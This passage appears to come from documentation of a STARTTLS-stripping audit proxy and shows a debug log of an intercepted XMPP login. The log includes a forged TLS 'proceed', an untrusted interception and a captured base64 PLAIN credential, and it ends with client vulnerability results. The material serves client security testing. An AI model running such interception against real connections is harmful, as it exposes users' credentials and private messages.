        - INFO     - <Session 0x7f083196a8d0> client ('192.168.139.1', 56892) has connected
        - INFO     - <Session 0x7f083196a8d0> connecting to target ('jabber.ccc.de', 5222)
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.UntrustedIntercept new: True>
        - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='10051743579572304948' from='jabber.ccc.de' version='1.0' xml:lang='en'><stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server][mangled] "<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server][mangled] waiting for inbound SSL Handshake
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server][mangled] performing outbound SSL handshake
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server][mangled] None
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='6938642107398534259' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><register xmlns='http://jabber.org/features/iq-register'/><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><mechanism>PLAIN</mechanism><mechanism>X-OAUTH2</mechanism><mechanism>SCRAM-SHA-1</mechanism></mechanisms></stream:features>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN' xmlns:ga='http://www.google.com/talk/protocol/auth' ga:client-uses-full-bind-result='true'>AHRpbgB4eA==</auth>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<failure xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><not-authorized/></failure>"
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
        - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '/stream:stream>'
        - WARNING  - <Session 0x7f083196a8d0> terminated.

XMPP Audit results
^^^^^^^^^^^^^^^^^^

::

        - WARNING  - Ctrl C - Stopping server
        - INFO     -  -- audit results --
        - INFO     - [*] client: 192.168.139.1
        - INFO     -     [Vulnerable!] <class striptls.StripInboundTLS at 0x7f08319a6808>
        - INFO     -     [Vulnerable!] <class striptls.StripFromCapabilities at 0x7f08319a67a0>
        - INFO     -     [Vulnerable!] <class striptls.UntrustedIntercept at 0x7f08319a6870>

